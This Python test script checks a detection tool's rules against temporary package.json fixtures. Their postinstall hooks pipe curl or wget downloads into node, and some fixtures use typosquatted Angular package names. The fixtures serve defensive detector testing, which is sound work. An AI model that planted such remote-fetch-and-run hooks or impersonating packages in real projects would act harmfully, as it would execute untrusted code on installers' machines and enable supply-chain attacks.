#!/usr/bin/env python3
"""Check stdin flow and impersonation admission without executing fixtures."""
import os
from pathlib import Path
import subprocess
import tempfile
import json

ROOT = Path(__file__).resolve().parents[3]
CURL = 'micro-behaviors/process/deploy::npm-postinstall-curl-node-stdin'
WGET = 'micro-behaviors/process/deploy::npm-postinstall-wget-node-stdin'
BRAND = 'objectives/supply-chain/impersonation/brand::angular-core-scoped-squat-remote-install'
ARCHIVE = 'objectives/command-and-control/dropper/interpreter-stdin::impersonated-package-archived-node-loader'
RULES = [CURL, WGET, BRAND, ARCHIVE]
URL = 'https://web.archive.org/web/https://example.org/source.js'

def manifest(command, name='fixture-installer', description='Fixture installer'):
    return {'name': name, 'version': '1.0.0', 'description': description,
            'scripts': {'postinstall': command}}

def impersonator(command, name='@anguar/core'):
    return manifest(command, name, 'Angular - the core framework')

cases = [
    ('ordinary installer', manifest(f'curl -L {URL} | node'), {CURL}),
    ('wget stdout', manifest(f'wget -qO - {URL} | node'), {WGET}),
    ('framework impersonator', impersonator(f'curl -L {URL} | node'), {CURL, BRAND, ARCHIVE}),
    ('renamed variant', impersonator(f'curl -fsSL {URL} | node', '@angjlar/core'), {CURL, BRAND, ARCHIVE}),
    ('direct source', impersonator('curl -L https://example.org/code.js | node'), {CURL, BRAND}),
    ('upstream package name', impersonator(f'curl -L {URL} | node', '@angular/core'), {CURL}),
    ('no framework claim', manifest(f'curl -L {URL} | node', '@anguar/core'), {CURL}),
    ('Node reads a file', impersonator(f'curl -L {URL} | node local.js'), set()),
    ('curl saves a file', impersonator(f'curl -o local.js {URL} | node'), set()),
    ('wget saves a file', impersonator(f'wget {URL} | node'), set()),
    ('unrelated pipeline', impersonator(f'curl {URL}; printf code | node'), set()),
    ('unrelated archive URL', impersonator(f'echo {URL}; curl https://example.org/code.js | node'), {CURL, BRAND}),
    ('quoted help', impersonator(f'echo "curl -L {URL} | node"'), set()),
]
with tempfile.TemporaryDirectory(prefix='npm-stdin-controls-') as tmp:
    expected_by_path = {}
    for index, (label, content, expected) in enumerate(cases):
        path = Path(tmp) / str(index) / 'package.json'
        path.parent.mkdir()
        path.write_text(json.dumps(content))
        expected_by_path[str(path)] = (label, expected)
    result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
                             '--format', 'json', tmp],
                            text=True, capture_output=True, check=True)
    decoder = json.JSONDecoder()
    remaining = result.stdout.strip()
    files = []
    while remaining:
        report, end = decoder.raw_decode(remaining)
        files.extend(report['files'])
        remaining = remaining[end:].lstrip()
    checked = set()
    for file in files:
        if file['path'] not in expected_by_path:
            continue
        label, expected = expected_by_path[file['path']]
        actual = {trait['id'] for trait in file.get('traits', [])} & set(RULES)
        assert actual == expected, (label, expected, actual, result.stderr)
        checked.add(file['path'])
        print(f'PASS: {label}', flush=True)
    assert checked == set(expected_by_path), ('missing files', set(expected_by_path) - checked)
print(f'{len(cases)} controls passed')
